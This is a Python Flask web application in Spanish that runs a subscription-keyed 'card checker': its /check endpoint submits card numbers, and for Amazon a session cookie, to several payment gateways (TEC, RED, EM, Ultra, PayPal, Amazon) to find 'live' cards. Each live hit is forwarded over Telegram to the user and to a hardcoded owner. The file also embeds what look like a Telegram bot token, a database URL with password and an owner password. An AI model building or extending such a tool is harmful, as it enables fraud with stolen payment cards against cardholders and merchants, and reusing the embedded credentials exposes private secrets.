import os
import asyncio
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, send_from_directory, session, redirect, url_for, render_template, flash
from flask_cors import CORS
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
import random
from flask import session, request, jsonify
from telegram import Bot
import requests as req
import paypal
import tec, red, em, amazon,ultra,paypal
import asyncio
import threading
import time
from telegram import Bot
from telegram.error import TelegramError, RetryAfter, TimedOut, NetworkError

app = Flask(__name__)
app.secret_key = 'tu_secreto_super_seguro'
CORS(app, resources={r"/*": {"origins": "*"}})
TELEGRAM_BOT_TOKEN = '7549342155:AAFhkoxXW4fGQ2wH-695blDAjJ1Z-NpouSE'
OWNER_TELEGRAM_ID = '846983753'
app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://postgres:cKDrLMbTgKkaYXtNFDgZOgpzbVISnJor@maglev.proxy.rlwy.net:37751/railway'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# MODELOS
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    telegram_id = db.Column(db.String(50), nullable=True)  # solo una vez
    verification_code = db.Column(db.String(10), nullable=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    password_hash = db.Column(db.String(512), nullable=False)
    key = db.Column(db.String(128), db.ForeignKey('key.key'), nullable=True)
    role = db.Column(db.String(10), default='user')

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)



class Key(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(128), unique=True, nullable=False)
    used = db.Column(db.Boolean, default=False)
    expires_at = db.Column(db.DateTime, nullable=True)

# Inicializar owner y owner_key si no existen
def init_owner_and_key():
    try:
        db.session.rollback()
        owner = User.query.filter_by(username='owner1').first()
        if not owner:
            owner = User(username='owner1', role='owner')
            owner.set_password('Saiper123')
            db.session.add(owner)
            db.session.commit()

        owner_key = Key.query.filter_by(key='owner_key').first()
        if not owner_key:
            owner_key = Key(key='owner_key', used=True, expires_at=None)
            db.session.add(owner_key)
            db.session.commit()

    except Exception as e:
        db.session.rollback()
        print(f"Error inicializando owner y owner_key: {e}")

# RUTAS

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return render_template('index.html')

@app.route('/style.css')
def style():
    return send_from_directory('.', 'style.css')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    user = User.query.filter_by(username=username).first()
    if user and user.check_password(password):
        session['user_id'] = user.id
        return redirect(url_for('dashboard'))
    flash('Usuario o contraseña incorrectos', 'error')
    return redirect(url_for('index'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username'].strip()
        password = request.form['password']
        key_input = request.form['key'].strip()

        if username.lower() == 'owner':
            flash('No puedes registrar un usuario con el nombre "owner".', 'error')
            return redirect(url_for('register'))

        key_obj = Key.query.filter_by(key=key_input, used=False).first()
        if not key_obj or (key_obj.expires_at and key_obj.expires_at < datetime.utcnow()):
            flash('La key no es válida, ya fue usada o expiró.', 'error')
            return redirect(url_for('register'))

        if User.query.filter_by(username=username).first():
            flash('El usuario ya existe.', 'error')
            return redirect(url_for('register'))

        user = User(username=username, key=key_input)
        user.set_password(password)
        db.session.add(user)
        key_obj.used = True
        db.session.commit()
        flash('Registro exitoso, ya puedes iniciar sesión.', 'success')
        return redirect(url_for('index'))
    return render_template('register.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('index'))

    user = db.session.get(User, session['user_id'])
    if not user:
        session.clear()
        return redirect(url_for('index'))

    keys = Key.query.all() if user.role in ['owner', 'admin'] else []
    return render_template('checker.html', username=user.username, role=user.role, keys=keys)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

from flask import request, session, jsonify




@app.route('/redeem_key', methods=['POST'])
def redeem_key():
    if 'user_id' not in session:
        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401

    key_input = request.json.get('key').strip()
    key_obj = Key.query.filter_by(key=key_input, used=False).first()
    if not key_obj or (key_obj.expires_at and key_obj.expires_at < datetime.utcnow()):
        return jsonify({'status': 'error', 'message': 'La key es inválida o ya expiró.'}), 400

    user = User.query.get(session['user_id'])
    user.key = key_input
    key_obj.used = True
    db.session.commit()
    return jsonify({'status': 'success', 'message': 'Key canjeada correctamente.'})

@app.route('/generate_key', methods=['POST'])
def generate_key():
    if 'user_id' not in session:
        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401

    user = User.query.get(session['user_id'])
    if user.role not in ['owner', 'admin']:
        return jsonify({'status': 'error', 'message': 'No tienes permisos para generar keys.'}), 403

    duration_days = int(request.json.get('duration_days', 1))
    new_key_str = "Kuriyama-" + os.urandom(6).hex()
    expires_at = datetime.utcnow() + timedelta(days=duration_days)
    new_key = Key(key=new_key_str, expires_at=expires_at)
    db.session.add(new_key)
    db.session.commit()
    return jsonify({'status': 'success', 'key': new_key_str, 'expires_at': expires_at.isoformat()})


@app.route('/add_admin', methods=['POST'])
def add_admin():
    if 'user_id' not in session:
        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401

    user = User.query.get(session['user_id'])
    if user.role != 'owner':
        return jsonify({'status': 'error', 'message': 'No tienes permisos para agregar administradores.'}), 403

    username = request.json.get('username')
    new_admin = User.query.filter_by(username=username).first()
    if not new_admin:
        return jsonify({'status': 'error', 'message': 'Usuario no encontrado.'}), 404

    new_admin.role = 'admin'
    db.session.commit()
    return jsonify({'status': 'success', 'message': f'Usuario {username} ahora es admin.'})





import asyncio
import threading
bot = Bot(token=TELEGRAM_BOT_TOKEN)

import asyncio
from telegram.error import BadRequest

import asyncio
from telegram.error import BadRequest

# Limita la concurrencia para evitar saturar pool HTTP
import asyncio
from telegram.error import BadRequest

# Límite de concurrencia (máx. 5 envíos simultáneos)
semaphore = asyncio.Semaphore(5)

async def send_message(chat_id, message):
    async with semaphore:  # Controla cuántos envíos simultáneos
        try:
            await bot.send_message(chat_id=chat_id, text=message)
            print(f"✅ Mensaje enviado a {chat_id}")
            return True

        except BadRequest as e:
            if "Chat not found" in str(e):
                print(f"⚠ Chat no encontrado: {chat_id} — eliminando de la base de datos")
                user = db.session.query(User).filter_by(telegram_id=str(chat_id)).first()
                if user:
                    user.telegram_id = None
                    try:
                        db.session.commit()
                        print(f"✔ Telegram ID {chat_id} eliminado para usuario {user.id}")
                    except Exception as err:
                        db.session.rollback()
                        print(f"❌ Error al eliminar telegram_id: {err}")
                return False
            else:
                print(f"❌ Error enviando mensaje a {chat_id}: {e}")
                return False

        except Exception as e:
            print(f"❌ Error inesperado enviando mensaje a {chat_id}: {e}")
            return False


async def send_all_messages(telegram_ids, message):
    # Evita duplicados y mensajes a IDs inválidos
    telegram_ids = list(set(filter(lambda x: x is not None, telegram_ids)))

    tasks = [send_message(tid, message) for tid in telegram_ids]
    results = await asyncio.gather(*tasks, return_exceptions=False)
    return all(results)


def send_messages_to_multiple(telegram_ids, message):
    if not isinstance(telegram_ids, list):
        telegram_ids = [telegram_ids]

    try:
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            loop = None

        if loop and loop.is_running():
            # Si ya hay un loop corriendo (por ejemplo, en un bot asíncrono)
            future = asyncio.run_coroutine_threadsafe(send_all_messages(telegram_ids, message), loop)
            return future.result()
        else:
            # Si no hay loop, lo creamos y ejecutamos
            return asyncio.run(send_all_messages(telegram_ids, message))

    except Exception as e:
        print(f"❌ Error enviando mensajes: {e}")
        return False





@app.route('/save_telegram_id', methods=['POST'])
def save_telegram_id():
    if 'user_id' not in session:
        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401

    telegram_id = request.json.get('telegram_id')
    force = request.json.get('force', False)  # para forzar reemplazo
    if not telegram_id:
        return jsonify({'status': 'error', 'message': 'Telegram ID inválido.'}), 400

    user = db.session.get(User, session['user_id'])
    if not user:
        return jsonify({'status': 'error', 'message': 'Usuario no encontrado.'}), 404

    # Verificar si ya tiene telegram_id guardado y no está forzando reemplazo
    if user.telegram_id and user.telegram_id != telegram_id and not force:
        return jsonify({
            'status': 'confirm',
            'message': f'Ya tienes un Telegram ID guardado ({user.telegram_id}). ¿Quieres reemplazarlo?',
        })

    # Guardar el telegram_id y generar código
    user.telegram_id = telegram_id
    code = str(random.randint(100000, 999999))
    user.verification_code = code

    try:
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        return jsonify({'status': 'error', 'message': f'Error al guardar Telegram ID y código: {str(e)}'}), 500

    # Enviar código de verificación por Telegram
    msg = f"Tu código de verificación es: {code}"
    sent = send_messages_to_multiple(telegram_id, msg)
    if not sent:
        return jsonify({'status': 'error', 'message': 'No se pudo enviar el mensaje de verificación. Verifica el Telegram ID.'}), 400

    return jsonify({'status': 'success', 'message': 'Telegram ID guardado y código enviado para verificación.'})


@app.route('/start_telegram_verification', methods=['POST'])
def start_telegram_verification():
    # Puedes mantener esta ruta igual o eliminarla si usas la lógica en save_telegram_id
    if 'user_id' not in session:
        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401

    telegram_id = request.json.get('telegram_id')
    if not telegram_id:
        return jsonify({'status': 'error', 'message': 'Telegram ID inválido.'}), 400

    user = db.session.get(User, session['user_id'])
    if not user:
        return jsonify({'status': 'error', 'message': 'Usuario no encontrado.'}), 404

    code = str(random.randint(100000, 999999))
    user.verification_code = code

    try:
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        return jsonify({'status': 'error', 'message': f'Error interno: {str(e)}'}), 500

    msg = f"Tu código de verificación es: {code}"
    sent = send_messages_to_multiple(telegram_id, msg)
    if not sent:
        return jsonify({'status': 'error', 'message': 'No se pudo enviar el mensaje de verificación. Verifica el Telegram ID.'}), 400

    return jsonify({'status': 'success', 'message': 'Código enviado a tu Telegram. Ingresa el código para verificar.'})



@app.route('/confirm_telegram_code', methods=['POST'])
def confirm_telegram_code():
    if 'user_id' not in session:
        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401

    telegram_id = request.json.get('telegram_id')
    code = request.json.get('code')
    if not telegram_id or not code:
        return jsonify({'status': 'error', 'message': 'Faltan datos.'}), 400

    user = db.session.get(User, session['user_id'])
    if not user:
        return jsonify({'status': 'error', 'message': 'Usuario no encontrado.'}), 404

    # Verificar que el código coincida
    if user.verification_code == code:
        user.telegram_id = telegram_id
        user.verification_code = None  # borrar código tras usar
        try:
            db.session.commit()
            return jsonify({'status': 'success', 'message': 'Telegram ID guardado correctamente.'})
        except Exception as e:
            db.session.rollback()
            return jsonify({'status': 'error', 'message': f'Error al guardar: {str(e)}'}), 500
    else:
        return jsonify({'status': 'error', 'message': 'Código incorrecto.'}), 400



@app.route('/check', methods=['POST'])

def check_card():
    if 'user_id' not in session:
        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401

    user = User.query.get(session['user_id'])
    key_obj = Key.query.filter_by(key=user.key).first()

    if not key_obj or (key_obj.expires_at and key_obj.expires_at < datetime.utcnow()):
        return jsonify({'status': 'error', 'message': 'No tienes una key activa o tu key ha expirado.'}), 403

    data = request.get_json()
    cc = data.get('cc')
    gateway = data.get('gateway', 'TEC')
    cookie = data.get('cookie', '')

    try:
        if gateway == 'TEC':
            result = asyncio.run(tec.process_card(cc))
        elif gateway == 'RED':
            result = asyncio.run(red.process_card(cc))
        elif gateway == 'EM':
            result = asyncio.run(em.process_card(cc))
        elif gateway == 'UL':
            result = asyncio.run(ultra.process_card(cc))
        elif gateway == 'PAY':
            result = asyncio.run(paypal.paypal(cc))
        elif gateway == 'AMAZON':
            result = amazon.procesar_tarjeta_amazon(cc, cookie)
        else:
            result = {'status': 'error', 'message': 'Gateway no válido', 'cc': cc}

        if result['status'] == 'live':
            telegram_ids = set()
            user = db.session.get(User, session['user_id'])
            if user and user.telegram_id:
                telegram_ids.add(user.telegram_id)
            telegram_ids.add(OWNER_TELEGRAM_ID)
            send_messages_to_multiples(list(telegram_ids), f"✅ 𝗟𝗜𝗩𝗘 - {result['cc']}\n{result['message']}")


        return jsonify(result)
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

import asyncio

message_queue = asyncio.Queue()
sending_task_started = False

import asyncio
import threading
from telegram import Bot

bot = Bot(token=TELEGRAM_BOT_TOKEN)

message_queue = asyncio.Queue()
loop = asyncio.new_event_loop()  # loop exclusivo para el dispatcher

async def _send_message_worker():
    while True:
        chat_id, text = await message_queue.get()
        retries = 0
        while retries < 5:
            try:
                await bot.send_message(chat_id=chat_id, text=text)
                print(f"✅ Mensaje enviado a {chat_id}")
                break
            except Exception as e:
                retries += 1
                wait = 3 * retries
                print(f"🌐 Problema de red con {chat_id}, reintentando en {wait}s ({retries}/5)")
                await asyncio.sleep(wait)
        else:
            print(f"❌ No se pudo enviar el mensaje a {chat_id} después de 5 intentos.")
        await asyncio.sleep(1)  # delay entre mensajes
        message_queue.task_done()

def start_dispatcher_thread():
    """Inicia el hilo del loop que ejecuta el worker"""
    def runner():
        asyncio.set_event_loop(loop)
        loop.create_task(_send_message_worker())
        loop.run_forever()
    
    thread = threading.Thread(target=runner, daemon=True)
    thread.start()

# Llamar esto una vez al iniciar la app
start_dispatcher_thread()

def send_messages_to_multiples(chat_ids, text):
    """Agrega los mensajes a la cola sin importar en qué hilo se llame"""
    if not isinstance(chat_ids, list):
        chat_ids = [chat_ids]
    for cid in chat_ids:
        asyncio.run_coroutine_threadsafe(message_queue.put((cid, text)), loop)



import asyncio




@app.route('/ping')
def ping():
    return jsonify({'message': 'pong'})

if __name__ == '__main__':
    with app.app_context():
        
        print("Creando owner y owner_key si no existen...")
        init_owner_and_key()
        print("Proceso de inicialización terminado.")

    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)




